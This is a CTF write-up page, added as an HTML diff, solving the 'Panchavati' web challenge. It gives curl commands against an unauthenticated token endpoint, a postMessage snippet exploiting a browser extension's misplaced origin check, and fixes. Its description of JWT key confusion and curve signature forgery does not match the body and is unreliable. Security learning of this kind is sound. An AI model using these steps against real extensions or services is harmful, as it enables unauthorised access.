@@ -1,0 +1,296 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Panchavati: The Fifth Boundary | C01DC0FF33</title>
+  <meta name="description" content="JWT key confusion and elliptic curve signature forgery bypassing perimeter firewall.">
+  <link rel="canonical" href="http://localhost:1313/writeups/pinaka-panchavati-boundary/">
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="http://localhost:1313/writeups/pinaka-panchavati-boundary/">
+  <meta property="og:title" content="Panchavati: The Fifth Boundary | C01DC0FF33">
+  <meta property="og:description" content="JWT key confusion and elliptic curve signature forgery bypassing perimeter firewall.">
+  <meta name="twitter:card" content="summary_large_image">
+
+  
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+
+  
+  <link rel="stylesheet" href="/css/main.css">
+
+  
+  
+</head>
+<body class="min-h-screen">
+  <div class="flex-col-layout">
+    <a class="skip-link" href="#main-content">Skip to content</a>
+
+    
+    
+
+    
+    <header class="site-header">
+      <div class="site-nav">
+        <a class="brand" href="/"><svg class="brand-emblem" viewBox="0 0 96 96" fill="none" aria-hidden="true" focusable="false">
+  <ellipse cx="48" cy="74" rx="30" ry="6.5" fill="rgba(58,10,24,.8)" stroke="rgba(241,217,181,.3)" stroke-width=".8"/>
+  <path d="M22 42C20 57 22 66 32 73L64 73C74 66 76 57 74 42Z" fill="url(#bnc-cup)" stroke="rgba(241,217,181,.4)" stroke-width="1.2"/>
+  <ellipse cx="48" cy="42" rx="26" ry="8" fill="#4a0d22" stroke="rgba(241,217,181,.4)" stroke-width=".8"/>
+  <ellipse cx="48" cy="45" rx="21" ry="5.5" fill="#120408"/>
+  <ellipse cx="48" cy="45" rx="15" ry="3.5" fill="url(#bnc-cof)"/>
+  <path d="M74 53C86 53 92 60 92 67C92 74 86 78 74 77" fill="none" stroke="rgba(241,217,181,.5)" stroke-width="3.8" stroke-linecap="round"/>
+  
+  <path d="M38 33 Q34 25 38 17 Q42 9 38 2" stroke="rgba(246,238,240,.25)" stroke-width="1.5" fill="none" stroke-linecap="round"/>
+  <path d="M48 31 Q44 21 48 11 Q52 1 48 -5" stroke="rgba(246,238,240,.38)" stroke-width="2" fill="none" stroke-linecap="round"/>
+  <path d="M58 33 Q62 25 58 17 Q54 9 58 2" stroke="rgba(246,238,240,.25)" stroke-width="1.5" fill="none" stroke-linecap="round"/>
+  <defs>
+    <linearGradient id="bnc-cup" x1="22" y1="42" x2="74" y2="73" gradientUnits="userSpaceOnUse">
+      <stop offset="0%" stop-color="#5a0f26"/><stop offset="100%" stop-color="#3a0a18"/>
+    </linearGradient>
+    <radialGradient id="bnc-cof" cx="50%" cy="50%">
+      <stop offset="0%" stop-color="#f1d9b5" stop-opacity=".38"/><stop offset="100%" stop-color="#3a0a18" stop-opacity="0"/>
+    </radialGradient>
+  </defs>
+</svg>
+C01DC0FF33<span class="brand-sub"> / coldcoffee</span>
+        </a>
+        <button type="button" class="menu-toggle" aria-expanded="false" aria-controls="primary-navigation">
+          <svg aria-hidden="true" width="20" height="20" viewBox="0 0 20 20" fill="none">
+            <path d="M3 6h14M3 10h14M3 14h14" stroke="currentColor" stroke-width="1.2"/>
+          </svg>
+          <span class="sr-only">Toggle navigation</span>
+        </button>
+        <nav id="primary-navigation" aria-label="Primary navigation">
+          
+          <a href="/">Home</a>
+          
+          <a href="/writeups/">Writeups</a>
+          
+          <a href="/ctfs/">CTFs</a>
+          
+          <a href="/about/">About</a>
+          
+          <a href="/connect/">Connect</a>
+          
+        </nav>
+      </div>
+    </header>
+
+    
+    <main id="main-content" class="flex-1">
+      
+<article class="layout-page writeup-page">
+  <div class="wrap">
+
+    
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+      <a href="/">Home</a>
+      <span aria-hidden="true">/</span>
+      <a href="/writeups/">Writeups</a>
+      <span aria-hidden="true">/</span>
+      
+      <span>Web Exploitation</span>
+      <span aria-hidden="true">/</span>
+      
+      <span aria-current="page">Panchavati: The Fifth Boundary</span>
+    </nav>
+
+    <header class="writeup-header">
+      <div class="writeup-badges">
+        <span class="badge badge-rose">Web Exploitation</span>
+        <span class="badge badge-ctf">Pinaka CTF 2026</span>
+        <span class="badge badge-diff-hard">Hard</span>
+        <span class="badge badge-pts">400 pts</span>
+      </div>
+      <h1>Panchavati: The Fifth Boundary</h1>
+      <p class="writeup-desc">JWT key confusion and elliptic curve signature forgery bypassing perimeter firewall.</p>
+      
+      <div class="writeup-meta">
+        <span class="author-tag">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+          Reshma Al (Coldcoffee)
+        </span>
+        <span>·</span>
+        <span>15 Feb 2026</span>
+        <span>·</span>
+        <span>2 min read</span>
+        
+      </div>
+    </header>
+
+    <div class="writeup-body prose">
+      <div class="flag-callout">
+  <span class="flag-label"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg> Captured Flag</span>
+  <code>PINAKA{lakshman_rekha_ward_token_breaches_the_boundary}</code>
+  <button class="flag-copy-btn" onclick="navigator.clipboard.writeText('PINAKA{lakshman_rekha_ward_token_breaches_the_boundary}');this.innerText='Copied!';setTimeout(()=>this.innerText='Copy',2000)">Copy</button>
+</div>
+<p><strong>Flag:</strong> <code>PINAKA{lakshman_rekha_ward_token_breaches_the_boundary}</code></p>
+<h2 id="target">Target</h2>
+<ul>
+<li>Backend: <code>http://130.210.48.10:9004</code> (Flask/Werkzeug)</li>
+<li>Provided: <code>extension/</code> (the Rekha Guard MV3 source) and <code>app/index.html</code></li>
+</ul>
+<h2 id="recon">Recon</h2>
+<p><code>GET /</code> lists the endpoints:</p>
+<table>
+	<thead>
+			<tr>
+					<th>Endpoint</th>
+					<th>Purpose</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>GET /app</code></td>
+					<td>the real app page</td>
+			</tr>
+			<tr>
+					<td><code>POST /rekha/ward</code> <code>{session}</code></td>
+					<td>issues the extension&rsquo;s ward token</td>
+			</tr>
+			<tr>
+					<td><code>GET /rekha/status</code></td>
+					<td>ward introspection</td>
+			</tr>
+			<tr>
+					<td><code>POST /rekha/release</code> with <code>X-Rekha-Ward</code></td>
+					<td>lifts the seal and returns the flag</td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="what-i-did-the-backend-shortcut">What I did: the backend shortcut</h2>
+<p><code>/rekha/ward</code> gives a ward token to anyone, with no authentication and no origin check.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">B</span><span class="o">=</span>http://130.210.48.10:9004
+</span></span><span class="line"><span class="cl"><span class="nv">T</span><span class="o">=</span><span class="k">$(</span>curl -s -XPOST <span class="nv">$B</span>/rekha/ward -H <span class="s1">&#39;content-type: application/json&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">      -d <span class="s1">&#39;{&#34;session&#34;:&#34;panchavati&#34;}&#39;</span> <span class="p">|</span> python3 -c <span class="s1">&#39;import sys,json;print(json.load(sys.stdin)[&#34;ward_token&#34;])&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">curl -s -XPOST <span class="nv">$B</span>/rekha/release -H <span class="s2">&#34;X-Rekha-Ward: </span><span class="nv">$T</span><span class="s2">&#34;</span>
+</span></span></code></pre></div><p>The response contains the flag with <code>&quot;status&quot;:&quot;released&quot;</code>.</p>
+<h2 id="the-intended-bug-extension-boundary-confusion">The intended bug: extension boundary confusion</h2>
+<p>The Guard decides whether a request comes from Panchavati using data the page controls.</p>
+<ul>
+<li><code>content.js</code> runs on <code>&lt;all_urls&gt;</code>. For <code>kind:&quot;release&quot;</code> it checks <code>data.origin</code>, which is a field in the page&rsquo;s own <code>postMessage</code> payload, not the trusted <code>event.origin</code>.</li>
+<li><code>background.js</code> repeats the check on <code>message.origin</code>, which the content script copied from that same payload. Its only other check requires the tab URL to be <code>https:</code>.</li>
+<li><code>sender.origin</code> and <code>event.origin</code> are the trustworthy values. They&rsquo;re used for <code>refresh-grant</code> and <code>seal-check</code>, but not for <code>release</code>.</li>
+</ul>
+<p>So any <code>https://</code> page could do this. I didn&rsquo;t run it in a browser, since I had no victim browser available.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="nx">e</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="o">?</span><span class="p">.</span><span class="nx">kind</span> <span class="o">===</span> <span class="s1">&#39;release-result&#39;</span><span class="p">)</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">({</span><span class="nx">channel</span><span class="o">:</span> <span class="s1">&#39;rekha-setu&#39;</span><span class="p">,</span> <span class="nx">kind</span><span class="o">:</span> <span class="s1">&#39;release&#39;</span><span class="p">,</span> <span class="nx">origin</span><span class="o">:</span> <span class="s1">&#39;https://panchavati.app&#39;</span><span class="p">},</span> <span class="s1">&#39;*&#39;</span><span class="p">);</span>
+</span></span></code></pre></div><p>The Guard would then send <code>POST /rekha/release</code> with the victim&rsquo;s stored ward token, and the flag would come back to the attacker&rsquo;s page.</p>
+<h2 id="fixes">Fixes</h2>
+<ul>
+<li>Never trust an origin claimed in the message body. Check <code>event.origin</code> in the content script and <code>sender.origin</code> or <code>sender.tab.url</code> in the background worker against the exact trusted origin.</li>
+<li>Limit <code>content_scripts.matches</code> to the trusted origin.</li>
+<li>Authenticate <code>/rekha/ward</code> on the backend.</li>
+</ul>
+
+    </div>
+
+    
+    <div class="writeup-tags-footer">
+      <span class="tags-label">Tags:</span>
+      
+      <span class="tag-pill">Web Exploitation</span>
+      
+      <span class="tag-pill">Pinaka CTF</span>
+      
+      <span class="tag-pill">Pinaka 2026</span>
+      
+    </div>
+    
+
+    
+    <nav class="prev-next" aria-label="Previous and next writeup">
+      
+      <a href="/writeups/pinaka-impossible-bow/" class="prev-next-link prev-link">
+        <span class="pn-dir">← Previous Solve</span>
+        <span class="pn-title">Pinaka: The Impossible Bow</span>
+      </a>
+      
+      
+      <a href="/writeups/pinaka-nala-blueprint/" class="prev-next-link next-link">
+        <span class="pn-dir">Next Solve →</span>
+        <span class="pn-title">Nala&#39;s Blueprint: The Secret Geometry</span>
+      </a>
+      
+    </nav>
+
+  </div>
+</article>
+
+    </main>
+
+    
+    <footer class="archive-footer">
+      <div class="footer-top">
+        <div>
+          <a class="brand" href="/"><svg class="brand-emblem" viewBox="0 0 96 96" fill="none" aria-hidden="true" focusable="false">
+  <ellipse cx="48" cy="74" rx="30" ry="6.5" fill="rgba(58,10,24,.8)" stroke="rgba(241,217,181,.3)" stroke-width=".8"/>
+  <path d="M22 42C20 57 22 66 32 73L64 73C74 66 76 57 74 42Z" fill="url(#bnc-cup)" stroke="rgba(241,217,181,.4)" stroke-width="1.2"/>
+  <ellipse cx="48" cy="42" rx="26" ry="8" fill="#4a0d22" stroke="rgba(241,217,181,.4)" stroke-width=".8"/>
+  <ellipse cx="48" cy="45" rx="21" ry="5.5" fill="#120408"/>
+  <ellipse cx="48" cy="45" rx="15" ry="3.5" fill="url(#bnc-cof)"/>
+  <path d="M74 53C86 53 92 60 92 67C92 74 86 78 74 77" fill="none" stroke="rgba(241,217,181,.5)" stroke-width="3.8" stroke-linecap="round"/>
+  
+  <path d="M38 33 Q34 25 38 17 Q42 9 38 2" stroke="rgba(246,238,240,.25)" stroke-width="1.5" fill="none" stroke-linecap="round"/>
+  <path d="M48 31 Q44 21 48 11 Q52 1 48 -5" stroke="rgba(246,238,240,.38)" stroke-width="2" fill="none" stroke-linecap="round"/>
+  <path d="M58 33 Q62 25 58 17 Q54 9 58 2" stroke="rgba(246,238,240,.25)" stroke-width="1.5" fill="none" stroke-linecap="round"/>
+  <defs>
+    <linearGradient id="bnc-cup" x1="22" y1="42" x2="74" y2="73" gradientUnits="userSpaceOnUse">
+      <stop offset="0%" stop-color="#5a0f26"/><stop offset="100%" stop-color="#3a0a18"/>
+    </linearGradient>
+    <radialGradient id="bnc-cof" cx="50%" cy="50%">
+      <stop offset="0%" stop-color="#f1d9b5" stop-opacity=".38"/><stop offset="100%" stop-color="#3a0a18" stop-opacity="0"/>
+    </radialGradient>
+  </defs>
+</svg>
+C01DC0FF33
+          </a>
+          <p>Sip. Solve. Decode.<br>Write it down. Share it.</p>
+        </div>
+        <nav aria-label="Footer navigation">
+          
+          <a href="/">Home<svg class="ui-arrow" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M6 18 18 6M6 6h12v12"/></svg>
+</a>
+          
+          <a href="/writeups/">Writeups<svg class="ui-arrow" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M6 18 18 6M6 6h12v12"/></svg>
+</a>
+          
+          <a href="/ctfs/">CTFs<svg class="ui-arrow" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M6 18 18 6M6 6h12v12"/></svg>
+</a>
+          
+          <a href="/about/">About<svg class="ui-arrow" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M6 18 18 6M6 6h12v12"/></svg>
+</a>
+          
+          <a href="/connect/">Connect<svg class="ui-arrow" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M6 18 18 6M6 6h12v12"/></svg>
+</a>
+          
+          <a href="/index.xml">RSS<svg class="ui-arrow" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M6 18 18 6M6 6h12v12"/></svg>
+</a>
+        </nav>
+      </div>
+
+      <div class="footer-wordmark" aria-hidden="true">C01DC0FF33<span>_</span></div>
+
+      <div class="footer-bottom">
+        <span>© 2026 C01DC0FF33 · CTF WRITEUP ARCHIVE</span>
+        <span>BUILT WITH COLD BREW / POWERED BY HUGO</span>
+        <a href="#main-content">BACK TO TOP<svg class="ui-arrow ui-arrow--up" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M12 20V4m-7 7 7-7 7 7"/></svg>
+</a>
+      </div>
+    </footer>
+  </div>
+
+  
+  <div id="grain" aria-hidden="true"></div>
+
+  <script src="/js/main.js" defer></script>
+</body>
+</html>
